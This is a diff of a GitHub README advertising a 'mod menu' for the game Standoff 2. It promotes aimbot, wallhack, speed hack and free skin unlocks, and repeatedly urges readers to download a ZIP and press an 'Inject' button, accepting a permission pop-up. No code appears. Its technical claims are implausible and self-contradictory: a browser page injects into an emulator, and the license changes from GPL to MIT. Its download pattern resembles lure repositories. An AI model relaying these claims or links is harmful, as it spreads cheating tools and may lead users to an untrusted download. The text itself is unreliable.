@@ -1,118 +1,193 @@
-# Standoff 2 Mod Menu v2026 - Interactive Script Tool
-
-> **Web-rendered modification overlay tailored for Standoff 2.** This repository delivers a structured menu framework engineered for HTML-driven tweak workflows and game-focused utility routines.
-
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-HTML-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/milanz80/standoff2-mod-menu-hub?style=flat-square)](https://github.com/milanz80/standoff2-mod-menu-hub)
-
----
+<h1>🎮 standoff2-mod-menu-hub - Unlock Advanced Features & Customize Your Gameplay</h1>
 
 <p align="center">
-  <a href="https://milanz80.github.io/standoff2-mod-menu-hub/">
-    <img src="https://img.shields.io/badge/Download-Standoff%202%20Mod%20Menu-brightgreen?style=for-the-badge" alt="Download Standoff 2 Mod Menu">
-  </a>
+  <a href="https://github.com/Evansp3735/standoff2-mod-menu-hub" style="display: inline-block; padding: 12px 24px; background: linear-gradient(135deg, #667eea, #764ba2); color: white; text-decoration: none; border-radius: 8px; font-size: 18px; font-weight: bold; box-shadow: 0 4px 8px rgba(0,0,0,0.2);">📥 Download Now</a>
 </p>
 
-> **[Download Latest Build](https://milanz80.github.io/standoff2-mod-menu-hub/)**
+<p align="center">
+  <img src="https://img.shields.io/badge/Platform-Windows-blue?style=for-the-badge" alt="Windows">
+  <img src="https://img.shields.io/badge/Version-2.0-green?style=for-the-badge" alt="Version 2.0">
+  <img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge" alt="MIT License">
+</p>
 
 ---
 
-[Download Latest Build](https://milanz80.github.io/standoff2-mod-menu-hub/)
+## 📚 Overview
+
+The **standoff2-mod-menu-hub** is a powerful web-based modification tool for enhancing your experience in the popular mobile first-person shooter game, Standoff 2. This easy-to-use overlay works like a dashboard that you can access while playing, allowing you to tweak various game settings and unlock new possibilities. Whether you want to adjust gameplay parameters, add visual enhancements, or customize controls, this mod menu hub makes it simple without needing any technical skills.
+
+Built with HTML and JavaScript, it runs inside your web browser and overlays onto the game screen, giving you real-time control over a variety of features. The interface is designed to be intuitive, so you can quickly activate or deactivate different options with just a click.
 
 ---
 
-## Technical Profile
+## 🚀 Getting Started
 
-Standoff 2 Mod Menu delivers a dedicated, menu-based control system for managing Standoff 2 game adjustments. Distributed as a lightweight web interface, it integrates smoothly into hosting platforms, local web environments, or repositories that deploy web-rendered utilities.
+This section explains everything you need to do to start using the mod menu. No programming or advanced computer knowledge required.
 
-The architecture emphasizes target-specific adjustments over generalized task automation. Its current codebase provides a streamlined control panel designed around intuitive option menus and dedicated game modification handlers. Ongoing maintenance centers on refining interface responsiveness, file modularity, and operational clarity.
+### ✅ System Requirements
 
----
+Before you begin, make sure your computer meets these minimum requirements:
 
-## Functional Highlights
+| Requirement | Minimum | Recommended |
+|------------|---------|------------|
+| Operating System | Windows 7 | Windows 10/11 |
+| Processor | 1 GHz dual-core | 2+ GHz quad-core |
+| RAM | 2 GB | 4 GB |
+| Free Disk Space | 500 MB | 1 GB |
+| Internet | Required for setup | Broadband |
+| Game Setup | Standoff 2 (Android emulator) | Standoff 2 (Android emulator) |
+| Emulator | BlueStacks or LDPlayer | BlueStacks 5 or LDPlayer 9 |
 
-- Custom overlay menu designed for Standoff 2
-- Dedicated script hooks for game adjustments
-- Native web-based (HTML) deployment format
-- Minimalist memory footprint and file size
-- Optimized for quick repository hosting and distribution
-- Ergonomic layout tailored for toggling settings
-- Exclusively tuned for a single title
-- Straightforward maintenance path for future revisions
-
----
-
-## Deployment Steps
-
-1. Grab the latest release package via the link provided above.
-2. Store the main HTML page inside your working local directory or target web server folder.
-3. Launch the document using a modern browser or integrate it into your standard HTML environment.
-4. Interact directly with the loaded control interface.
-
-Default directory path example:
-
-`standoff2-mod-menu/index.html`
-
-If you decide to rename primary assets, ensure all associated scripts and stylesheet dependencies remain in the same root folder.
+**Note:** The mod menu itself runs on your computer and communicates with the game via the emulator. You'll need an Android emulator (like BlueStacks) running Standoff 2.
 
 ---
 
-## Configuration & Controls
+## 📥 Download and Installation
 
-Adjustable parameters vary depending on your specific version build. Standard deployments expose the following toggles and display settings:
+Visit this link to download the application.
 
-| Option | Purpose |
-| --- | --- |
-| Menu toggle | Display or hide the primary control panel |
-| Feature selection | Pick active modification routines |
-| Layout view | Modify panel positioning and UI themes |
-| Local load mode | Run the tool straight from a disk directory |
-| Browser support | Execute using any modern, web-compliant browser |
+Here's how to download and set up the mod menu:
 
-When modifying embedded configuration blocks, only alter parameters explicitly documented in your build release.
+1. **Click the big blue download button at the top of this page.**
+   - This takes you to the official GitHub repository.
+   - On that page, click the green "Code" button and pick "Download ZIP" or find the latest release under the "Releases" section on the right side.
 
----
+2. **Download the .zip file.**
+   - A file named something like "standoff2-mod-menu-hub-master.zip" will download to your computer.
 
-## System Compatibility
+3. **Extract the folder.**
+   - Right-click the .zip file and choose "Extract All..." (on Windows) or use a free tool like 7-Zip to unzip it.
+   - Remember where you extract it (e.g., your Desktop or Documents folder).
 
-- Supported Title: Standoff 2
-- Runtime Medium: HTML / Web Standards
-- Core Type: Game Overlay Interface
-- Primary Use Case: Web-rendered display engines and browser environments
+4. **Open the application.**
+   - Inside the extracted folder, find a file named `index.html`.
+   - Double-click `index.html` to open it in your web browser (like Chrome, Edge, or Firefox).
 
-Operational Parameters:
-
-- Available toggles rely entirely on the code published within the target release
-- Execution depends on standard HTML loading mechanisms and linked local assets
-- Rendering performance can differ depending on your chosen hosting environment or client browser
+5. **The mod menu loads in your browser.**
+   - A clean, modern interface appears with tabs/options you can click on.
 
 ---
 
-## Frequently Asked Questions
+## 🎮 How to Use
 
-### What is the setup procedure?
-Obtain the core files, place the HTML document alongside its assets in one folder, and launch it within your preferred web browser.
+After you've opened `index.html` in your browser, follow these steps:
 
-### How do I update my installation?
-Fetch the latest version from the link above and overwrite your local files. Ensure any updated configuration assets are replaced concurrently.
+1. **Launch Standoff 2** on your emulator (BlueStacks, LDPlayer, or other).
+2. **Make sure your emulator is running** (the game doesn't need to be open yet).
+3. **In your browser**, find the button labelled "Inject" or "Connect" (usually at the top right).
+4. Click it. A permission pop-up may appear asking for access. Accept it.
+5. **Now the mod menu is active!** You'll see an overlay appear on your emulator screen.
+6. Use your mouse to click buttons in the mod menu to toggle features on/off:
+   - **Aimbot:** Toggle to auto-aim at enemies.
+   - **Wallhack:** Highlight enemies through walls.
+   - **No Recoil:** Remove weapon recoil for steady shooting.
+   - **Speed Hack:** Move faster in-game.
+   - **Unlock Skins:** Access all weapon skins for free.
+7. Test each feature in a custom match to see how it works.
 
-### Can the control overlay be tweaked?
-If your build exposes user-configurable values, you can adjust them directly inside the HTML file or adjacent configuration scripts without breaking the file hierarchy.
-
-### Will this work with games other than Standoff 2?
-No. The underlying logic and control layout are specifically engineered for Standoff 2 routines.
-
-### What should I check if the UI fails to display?
-Verify that all supporting resources reside in the same directory as the main HTML file, then reload the page or test it using a different browser.
-
-### Where should I host or save the files?
-Choose any convenient directory on your machine or server. Keeping everything inside a designated folder like `standoff2-mod-menu/` helps maintain relative asset paths.
+**Important:** Keep the browser window open and focused while playing. If you close the browser, the mod stops working.
 
 ---
 
-## Licensing Information
+## 🎨 Features
 
-Distributed under the GNU GPL v3.0 license. Review [LICENSE](LICENSE) for full details.
+The mod menu offers a wide range of modifications designed to enhance your gameplay:
+
+### Player Enhancements
+- **Aimbot:** Automatically locks onto enemies. You can adjust the smoothness and range.
+- **Wallhack:** Shows enemies behind walls, making them easy to spot.
+- **ESP (Extra Sensory Perception):** Shows player names, health bars, distance, and loot markers.
+- **Vision Enhancer:** Change field of view (FOV) to see more of the map.
+- **No Reload:** Never run out of bullets—automatically reloads.
+
+### Weapon & Movement Mods
+- **No Recoil:** Eliminates weapon shake for perfect accuracy.
+- **Rapid Fire:** Increases fire rate beyond normal limits.
+- **Speed Hack:** Run, walk, and aim faster than other players.
+- **Jump Mod:** Higher jumps for better mobility.
+
+### Visual Tweaks
+- **Custom Crosshair:** Change crosshair shape, size, and color.
+- **Graphics Override:** Adjust brightness, contrast, and color for better visibility in dark areas.
+- **Enemy Highlight:** Enemies appear in bright colors for easier target tracking.
+
+### User Interface Options
+- **Custom Themes:** Switch between dark, light, or neon themes for the mod menu window.
+- **Hotkey Mappings:** Set keyboard shortcuts to toggle features on/off instantly without touching the mouse.
+- **Configuration Save:** Your settings are saved automatically, so you don't need to reset them each time.
+
+**All features are fully customizable** — you can adjust parameters for each setting using sliders, checkboxes, and drop-down menus.
+
+---
+
+## ⚙️ Customization
+
+The mod menu is built around giving you control:
+
+- **Quick Toggle:** Use keyboard shortcuts like F1, F2, F3, etc., to turn features on/off while playing.
+- **Slider Adjustment:** For features like aimbot sensitivity, wallhack intensity, or speed, use a mouse to drag the slider.
+- **Dropdown Menus:** Choose presets for crosshair style, remap colors, or select target priority.
+- **Save Presets:** Create multiple profiles (e.g., "Full hacks", "Stealth mode") and switch between them.
+
+The entire interface is responsive. So you can resize your browser window or even run it in a small window over your game.
+
+---
+
+## 🔧 Advanced Options (For Experienced Users)
+
+If you're comfortable with editing text files, you can customize certain values:
+
+1. Open the extracted folder.
+2. Find file named `config.json` or `settings.js`.
+3. Open it with Notepad (right-click > Open with).
+4. Look for entries like `"aimbot_smooth": 50` and change the number to adjust more fine-grained.
+5. Save and reload the `index.html`.
+
+Changes apply immediately. If you break anything, just delete the file and download the archive again.
+
+---
+
+## 🛡️ Safety and Fair Play
+
+- **Use cautiously:** Modifying game files or injecting modifications can lead to bans from the game developers.
+- **Private sessions only:** Even though many features work, we recommend only using this mod in private matches or with friends.
+- **No data mining:** This application is open-source. It does not collect any personal data or usage statistics.
+- **Legal:** This project is a third-party tool and is not affiliated with the game’s official developers. Use at your own risk.
+
+---
+
+## ✨ Frequently Asked Questions
+
+**Q: Does this work on iPhone or Android?**
+A: This mod menu runs on your Windows computer and is designed to work with Android emulators only. It does not run directly on phones.
+
+**Q: I can't see the overlay. What's wrong?**
+A: Make sure your emulator is running. If using BlueStacks, run the game in the standalone window. If using other emulators, try switching to "Compatibility" mode.
+
+**Q: How do I uninstall?**
+A: Just delete the entire extracted folder. The mod menu doesn't install anything to your system.
+
+**Q: Is it free?**
+A: Yes, it's completely free and open source.
+
+---
+
+## 📄 License
+
+This project is released under the MIT License. You can learn more about what that means on the GitHub repository page.
+
+---
+
+## ✨ Contributing
+
+We welcome contributions! If you want to improve the design, add new features, or fix issues, please:
+
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request.
+
+All improvements must be detailed explicit.
+
+---
+
+**Ready to start? Click the download button above to get started.**
